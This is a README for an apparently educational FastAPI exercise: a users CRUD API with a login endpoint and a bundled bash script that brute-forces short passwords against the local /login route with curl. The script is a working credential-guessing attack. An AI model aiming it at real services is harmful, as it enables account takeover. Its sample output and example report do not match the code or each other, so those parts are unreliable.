<!-- START README -->

# Users CRUD + Controlled Brute-Force (FastAPI)

> **Educational use only.** All tests must be run **only** against this **local** API and with **practice accounts** created for the exercise.

## Requirements
- Python 3.10+
- (Windows) Git Bash or WSL to run `brute.sh`

## Setup
### It is recommended to create a virtual environment:

Windows (PowerShell)

```bash
# In the project folder
py -m venv .venv
.\.venv\Scripts\Activate.ps1
py -m pip install --upgrade pip
py -m pip install -r requirements.txt
```

## Run the API

```bash
py -m uvicorn main:app --reload
```

- Swagger UI: http://127.0.0.1:8000/docs  


> **Note:** The “database” is **in-memory**. If the server reloads (e.g., due to `--reload`), users are cleared and must be created again.

---

## Endpoints

- `POST /users` — create user (receives **plain-text password**)
- `GET /users` — list users (passwords not returned)
- `GET /users/{id}` — get user by id
- `PUT /users/{id}` — update (everything **except** password)
- `DELETE /users/{id}` — delete
- `POST /login` — authenticate (returns only `login successful` or `Invalid credentials`)

### Quick CRUD test (in `/docs`)

**1) POST /users**
```json
{
  "username": "demo",
  "password": "pass123",
  "email": "demo@mail.com",
  "is_active": true
}
```

**2) GET /users** 
    
**3) GET /users/{id} (e.g., {id} = 1)**


**4) PUT /users/{id} (e.g., {id} = 1)**
```json
{
  "email": "new@mail.com",
  "is_active": false
}
```

**5) Username conflict demo**  
Create user `admin`, then:
```json
{ "username": "admin" }
```
on `PUT /users/1` → should respond `username ya existe`.

**6) POST /login**
```json
{
  "username": "demo",
  "password": "pass123"
}
```

If your FastAPI path is defined with `user_id` (as in `/users/{user_id}`), feel free to replace `{id}` with `{user_id}` in the text so it matches your code exactly.


---

## Controlled brute-force (bash)

File: **`brute.sh`** (included). Run in **Git Bash** while the API is running:

```bash
./brute.sh
```
### Controlled brute-force script (what this does)

The script below performs a **controlled** brute-force test **against your own local API**.  
It iterates over a small **charset**, sends a POST to `/login` for each guess, and **stops on the first success**.  
You can safely tweak:
- `API` → URL of your local server (change port if needed)
- `USER` → the username to test (e.g., `demo`, `admin`, `leo`)
- `CHARS` → the candidate characters you want to try (e.g., letters, numbers)
- `MAXLEN` → the maximum password length to try
- `PAUSE_EVERY` and `PAUSE_TIME` → control how often to pause to avoid overloading the API

```bash
# brute.sh — controlled brute-force demo
# How it works:
# 1) Reads candidate passwords from the given charset.
# 2) For each candidate, sends POST /login to your local API.
# 3) If the response contains "login successful", it prints the finding and exits.
# Safety:
# - Small, fixed delay between attempts (sleep 0.2) to avoid overwhelming the API.
# - Intended ONLY for your local practice API and accounts created for this exercise.
# You can change:
# - API:  if your server runs on a different host/port.
# - USER: which username to test (demo/admin/leo/...).
# - CHARS: the character set to use for password combinations (letters, digits).
# - MAXLEN: the maximum password length to try (1–3).

#!/usr/bin/env bash

API="http://127.0.0.1:8000/login"

# Character set (letters + digits)
CHARS=(a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9)
MAXLEN=3
DELAY=0
PAUSE_EVERY=400
PAUSE_TIME=0.15

USER="$1"        # USER will be taken from the first argument passed to the script

attempts=0
start=$(date +%s)

attempt() {
  pwd="$1"
  attempts=$((attempts+1))

  payload='{"username":"'"$USER"'","password":"'"$pwd"'"}'
  resp=$(curl -s "$API" \
    -H "Content-Type: application/json" \
    --data "$payload")

  echo "[$attempts] '$pwd' -> $resp"

  if [[ "$resp" == *"login successful"* ]]; then
    end=$(date +%s)
    echo "FOUND: password='$pwd' in $attempts attempts, $((end-start))s"
    exit 0
  fi

  
  if (( attempts % PAUSE_EVERY == 0 )); then
    sleep "$PAUSE_TIME"
  fi
}

echo "[*] Brute-force on '$USER' | chars=${CHARS[*]} | maxlen=$MAXLEN"

# len=1
for c1 in "${CHARS[@]}"; do
  attempt "$c1"
done

# len=2
if [ "$MAXLEN" -ge 2 ]; then
  for c1 in "${CHARS[@]}"; do
    for c2 in "${CHARS[@]}"; do
      attempt "$c1$c2"
    done
  done
fi

# len=3
if [ "$MAXLEN" -ge 3 ]; then
  for c1 in "${CHARS[@]}"; do
    for c2 in "${CHARS[@]}"; do
      for c3 in "${CHARS[@]}"; do
        attempt "$c1$c2$c3"
      done
    done
  done
fi

echo "NOT found (up to length $MAXLEN). Attempts: $attempts"
exit 1

```

### What to report (example)
- Target user: `admin`  
- Wordlist size: 12  
- Delay between attempts: 0.2 s  
- **Result**: found `secret` in 6 attempts, ~2 s  
- Conclusion: weak/common passwords are cracked very quickly.

---

### Sample run (console output)

```bash
$ ./brute.sh
[1] Probando 'pass123' -> {"message":"Invalid credentials"}
[2] Probando '123456'  -> {"message":"Invalid credentials"}
[3] Probando 'admin'   -> {"message":"Invalid credentials"}
[4] Probando 'admin123'-> {"message":"Invalid credentials"}
[5] Probando 'demo'    -> {"message":"Invalid credentials"}
[6] Probando 'secret'  -> {"message":"Invalid credentials"}
[7] Probando 'qwerty'  -> {"message":"Invalid credentials"}
[8] Probando 'password'-> {"message":"Invalid credentials"}
[9] Probando 'adios'   -> {"message":"login successful"}
ENCONTRADA: password='adios' en 9 intentos, 2s
```
---
## Project structure
```
first-term-exam/
├─ main.py           # FastAPI (CRUD + login), in-memory "DB"
├─ brute.sh          # Bash brute-force script (controlled, uses curl)
├─ requirements.txt  # Dependencies
└─ README.md
```

### .gitignore
```gitignore
.venv/
__pycache__/
*.pyc
*.log
.DS_Store
Thumbs.db
```

<!-- END README -->
